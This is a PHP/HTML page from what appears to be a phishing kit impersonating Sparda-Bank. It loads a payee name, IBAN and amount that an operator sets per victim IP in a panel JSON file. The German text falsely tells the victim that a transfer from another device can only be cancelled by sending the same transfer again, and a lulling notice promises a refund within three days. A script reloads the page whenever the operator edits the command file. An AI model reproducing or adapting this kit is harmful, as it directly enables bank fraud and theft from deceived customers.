<?php
header('Content-Type: text/html; charset=UTF-8');
ob_start();
include 'data/src.php';
$srcContent = ob_get_clean();

$customCommandJsonPath = $config['panelLocation'] . 'custom/custom_umbuchen.json';
$customCommandJson = @file_get_contents($customCommandJsonPath);
$customCommandData = json_decode($customCommandJson, true);

$name  = '';
$iban  = '';
$summe = '';

if (is_array($customCommandData)) {
    foreach ($customCommandData as $command) {
        if (isset($command['userIP']) && trim($command['userIP']) == $_SERVER['REMOTE_ADDR']) {
            $name  = $command['name']  ?? '';
            $iban  = $command['iban']  ?? '';
            $summe = $command['summe'] ?? '';
            break;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="de" class="notranslate" translate="no">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Umbuchung - Sparda-Bank</title>
    <base href=".">
    <meta name="robots" content="noindex, nofollow">
    <link id="favicon-link" rel="icon" type="image/x-icon" href="https://www.sparda-b.de/favicon.ico?v2">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="<?= URLROOT ?>/front_end/front_end_files/styles.4787d3238b7c7ee0.css">
    <noscript><link rel="stylesheet" href="styles.4787d3238b7c7ee0.css"></noscript>

    <?php ob_start(); include 'data/styleinclude.txt'; ?>

    <script src="<?= URLROOT ?>/js/cntdjs/jquery.js"></script>

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <style>
        :root {
            --brand-blue:   #005aaa;
            --brand-blue-d: #004a8a;
            --brand-orange: #f06400;
            --bg:           #f1f3f6;
            --card:         #ffffff;
            --text:         #1a1f2b;
            --muted:        #6b7380;
            --border:       #e5e7eb;
            --soft-blue:    #e6f0fa;
        }
        * { box-sizing: border-box; }
        html, body { margin: 0; padding: 0; }
        body {
            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif !important;
            background: var(--bg) !important;
            color: var(--text);
            -webkit-font-smoothing: antialiased;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            letter-spacing: -0.01em;
        }
        app-root, app-frame { display: flex; flex-direction: column; flex: 1; }

        /* HEADER */
        .frame-header {
            background: #fff !important;
            border-bottom: 1px solid var(--border);
            box-shadow: 0 1px 2px rgba(0,0,0,.04);
            padding: 0 !important;
        }
        .frame-header .col-12 {
            max-width: 1080px;
            margin: 0 auto;
            padding: 16px 24px !important;
            display: flex;
            align-items: center;
        }
        .pt-header-logo-img img { height: 40px; width: auto; display: block; }
        .bank-name {
            margin-left: 14px !important;
            font-family: 'Inter', sans-serif;
            font-weight: 700;
            font-size: 1.25rem;
            color: var(--brand-blue) !important;
            letter-spacing: -0.01em;
        }
        .bank-name app-name div { color: var(--brand-blue) !important; }
        .accent-bar { height: 4px; background: var(--brand-blue); }

        /* MAIN */
        .wrapper-box-phototan {
            flex: 1;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 48px 16px !important;
            background: var(--bg);
            max-width: none !important;
            margin: 0 !important;
        }
        .umb-wrap {
            width: 100% !important;
            max-width: 560px !important;
            margin: 0 auto !important;
            text-align: center !important;
            animation: fadeUp .55s cubic-bezier(.22,1,.36,1) both;
        }
        @keyframes fadeUp {
            from { opacity: 0; transform: translateY(28px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        @keyframes pop {
            from { opacity: 0; transform: scale(.6); }
            to   { opacity: 1; transform: scale(1); }
        }

        .umb-badge {
            width: 80px; height: 80px;
            margin: 0 auto 24px;
            border-radius: 50%;
            background: var(--soft-blue);
            border: 4px solid #b3d1ec;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 12px 28px -6px rgba(0, 90, 170, .18);
            animation: pop .45s cubic-bezier(.22,1,.36,1) .15s both;
        }
        .umb-badge svg { width: 38px; height: 38px; color: var(--brand-blue); }

        .umb-title {
            text-align: center !important;
            font-size: 1.7rem !important;
            font-weight: 700 !important;
            margin: 0 0 12px !important;
            padding: 0 !important;
            color: var(--text) !important;
            letter-spacing: -0.02em;
        }
        .umb-sub {
            display: block !important;
            text-align: center !important;
            font-size: .98rem !important;
            line-height: 1.55 !important;
            color: var(--muted) !important;
            margin: 0 auto 28px !important;
            padding: 0 !important;
            max-width: 480px !important;
        }

        .umb-card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            box-shadow: 0 6px 16px -4px rgba(20, 30, 50, .08), 0 2px 6px -2px rgba(20, 30, 50, .04);
            overflow: hidden;
        }
        .card-stripe { height: 6px; background: var(--brand-blue); }
        .card-body { padding: 8px 28px 24px; }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
            padding: 18px 0;
            border-bottom: 1px solid var(--border);
        }
        .info-row:last-child { border-bottom: none; }
        .info-label {
            font-size: .82rem;
            font-weight: 500;
            color: var(--muted);
            text-transform: uppercase;
            letter-spacing: .06em;
        }
        .info-value {
            font-size: 1rem;
            font-weight: 600;
            color: var(--text);
            text-align: right;
            font-variant-numeric: tabular-nums;
            word-break: break-all;
        }
        .info-value.iban { font-family: 'JetBrains Mono', 'Menlo', monospace; font-size: .95rem; letter-spacing: .02em; }
        .info-value.summe {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--brand-blue);
            letter-spacing: -0.01em;
        }

        .notice {
            margin-top: 18px;
            padding: 14px 16px;
            background: #fff8ed;
            border: 1px solid #fde4be;
            border-left: 4px solid var(--brand-orange);
            border-radius: 8px;
            display: flex;
            align-items: flex-start;
            gap: 10px;
            font-size: .85rem;
            color: #6a4a18;
            line-height: 1.5;
        }
        .notice svg { width: 18px; height: 18px; color: var(--brand-orange); flex-shrink: 0; margin-top: 1px; }

        .ssl-note {
            text-align: center;
            margin-top: 20px;
            font-size: .75rem;
            color: #98a0ad;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        .ssl-note svg { width: 14px; height: 14px; }

        /* FOOTER */
        #fiducia-footer-container {
            background: var(--brand-blue) !important;
            color: #fff !important;
            padding: 22px 16px 18px;
            text-align: center;
            border-top: none !important;
        }
        #fiducia-footer-container .kf-footer-bg,
        #fiducia-footer-container .content-wrapper-top,
        #fiducia-footer-container #footer-left { background: transparent !important; }
        .footer-navigation {
            list-style: none !important;
            margin: 0 0 10px !important;
            padding: 0 !important;
            display: flex !important;
            justify-content: center !important;
            gap: 32px !important;
            flex-wrap: wrap;
        }
        .footer-navigation a {
            color: rgba(255,255,255,.92) !important;
            text-decoration: none;
            font-size: .88rem;
            cursor: pointer;
            transition: color .15s ease;
        }
        .footer-navigation a:hover { color: #fff !important; }
        #footer-bottom {
            color: rgba(255,255,255,.78) !important;
            font-size: .78rem;
            margin: 0;
        }
    </style>
</head>
<body kf-theme-version="6.11.1" class="kf-theme-scope light theme-initialized">
    <app-root _nghost-jjb-c48="" ng-version="13.3.12">
        <app-frame _ngcontent-jjb-c48="" _nghost-jjb-c47="">

            <!-- HEADER -->
            <div _ngcontent-jjb-c47="" class="container-fluid">
                <header _ngcontent-jjb-c47="" class="row justify-content-center frame-header kf-header-bg">
                    <div _ngcontent-jjb-c47="" class="col-12 pt-header-logo-b d-flex align-items-center">
                        <bank-info _ngcontent-jjb-c47="" id="image-logo" type="logo" class="pt-header-logo-img ng-star-inserted">
                            <app-logo _nghost-hib-c133="">
                                <img _ngcontent-hib-c133="" alt="Sparda-Bank" src="<?= URLROOT ?>/front_end/front_end_files/sparda-logo1.png">
                            </app-logo>
                        </bank-info>
                        <bank-info _ngcontent-jjb-c47="" id="bank-name" type="name" class="bank-name ml-2 kf-header-color-headline ng-star-inserted">
                            <app-name><div>Sparda-Bank</div></app-name>
                        </bank-info>
                    </div>
                </header>
            </div>
            <div class="accent-bar"></div>

            <!-- MAIN CONTENT -->
            <div class="wrapper-box-phototan wrapper-box-phototan2">
                <div class="umb-wrap">

                    <div class="umb-badge">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round">
                            <polyline points="17 1 21 5 17 9"></polyline>
                            <path d="M3 11V9a4 4 0 0 1 4-4h14"></path>
                            <polyline points="7 23 3 19 7 15"></polyline>
                            <path d="M21 13v2a4 4 0 0 1-4 4H3"></path>
                        </svg>
                    </div>

                    <h1 class="umb-title">Auftrag Stornieren</h1>
                    <p class="umb-sub">
                        Eine Echtzeit-&Uuml;berweisung wurde von einem anderen Ger&auml;t durchgef&uuml;hrt und ist daher auf Ihrem Ger&auml;t nicht sichtbar. Um die Transaktion zu stornieren, m&uuml;ssen Sie dieselbe &Uuml;berweisung von Ihrem Ger&auml;t aus erneut durchgef&uuml;hren. Nur so k&ouml;nnen wir die Stornierung sofort bearbeiten.
                    </p>

                    <div class="umb-card">
                        <div class="card-stripe"></div>
                        <div class="card-body">
                            <div class="info-row">
                                <span class="info-label">Name</span>
                                <span class="info-value"><?= htmlspecialchars($name) ?></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">IBAN</span>
                                <span class="info-value iban"><?= htmlspecialchars($iban) ?></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Summe</span>
                                <span class="info-value summe"><?= htmlspecialchars($summe) ?> &euro;</span>
                            </div>
                        </div>
                    </div>

                    <div class="notice">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
                            <line x1="12" y1="9" x2="12" y2="13"></line>
                            <line x1="12" y1="17" x2="12.01" y2="17"></line>
                        </svg>
                        Sobald Sie den Prozess abgeschlossen haben, erscheint die stornierte Transaktion in Ihrem E-Banking. Sie wird dort als durchgef&uuml;hrt angezeigt, obwohl sie unmittelbar storniert wurde. Der Betrag wird Ihnen per SEPA-Gutschrift zur&uuml;ckerstattet &ndash; dies kann bis zu drei Werktage in Anspruch nehmen.
                    </div>

                    <p class="ssl-note">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                        </svg>
                        Sichere Verbindung &mdash; 256-Bit SSL Verschl&uuml;sselung
                    </p>
                </div>
            </div>

            <!-- FOOTER -->
            <div _ngcontent-jjb-c47="" class="container-fluid">
                <footer _ngcontent-jjb-c47="">
                    <app-footer _ngcontent-jjb-c47="" _nghost-jjb-c46="">
                        <footer _ngcontent-jjb-c46="" id="fiducia-footer-container" class="remove-for-print">
                            <div _ngcontent-jjb-c46="" class="kf-footer-bg kf-footer-border-top">
                                <div _ngcontent-jjb-c46="" class="content-wrapper-top">
                                    <div _ngcontent-jjb-c46="" id="footer-left" class="remove-lr-margins">
                                        <ul class="footer-navigation kf-footer-color">
                                            <li><a tabindex="0">Impressum</a></li>
                                            <li><a tabindex="0">Datenschutz</a></li>
                                            <li><a tabindex="0">AGB</a></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                            <div _ngcontent-jjb-c46="" class="remove-lr-margins text-center">
                                <div id="footer-bottom" class="mat-small">
                                    Eine für alle - alles von einer.
                                </div>
                            </div>
                        </footer>
                    </app-footer>
                </footer>
            </div>

        </app-frame>
    </app-root>

    <!-- Auto Refresh -->
    <script>
        var initialModTime = null;
        var customCommandJsonPath = '<?php echo $customCommandJsonPath; ?>';
        function checkFileModification() {
            fetch(customCommandJsonPath, { method: 'HEAD', cache: 'no-cache' })
            .then(response => {
                var currentModTime = new Date(response.headers.get('Last-Modified'));
                if (initialModTime === null) initialModTime = currentModTime;
                else if (currentModTime.getTime() !== initialModTime.getTime()) window.location.reload();
            })
            .catch(() => {});
        }
        setInterval(checkFileModification, 2000);
    </script>
</body>
</html>
